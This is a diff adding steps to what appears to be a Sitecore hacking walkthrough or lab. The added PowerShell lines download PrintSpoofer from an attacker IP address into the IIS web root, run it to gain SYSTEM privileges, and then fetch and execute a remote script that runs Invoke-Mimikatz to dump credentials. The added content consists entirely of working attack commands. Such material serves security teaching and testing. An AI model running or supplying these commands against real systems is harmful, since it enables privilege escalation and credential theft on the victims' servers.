@@ -71,3 +71,13 @@ dotnet pack -c Netstandard20 -p:PackageVersion=1.0.2
 C:\tools\nuget\nuget.exe add bin\Netstandard20\spe10.1.0.2.nupkg -Source C:\git\sugnl-hacking-sitecore\example-3\nugetfeed
 ```
 
+```powershell
+(New-Object System.Net.WebClient).DownloadFile('http://172.22.150.124/PrintSpoofer64.exe','C:\inetpub\wwwroot\XM1.cm\printspoofer.exe')
+```
+
+```powershell
+C:\inetpub\wwwroot\XM1.cm\printspoofer.exe -i -c "cmd.exe /c whoami"
+```
+```powershell
+C:\inetpub\wwwroot\XM1.cm\printspoofer.exe -i -c "powershell.exe IEX (New-Object System.net.webclient).DownloadString('http://172.22.150.124/im.ps1');Invoke-Mimikatz -DumpCreds"
+```
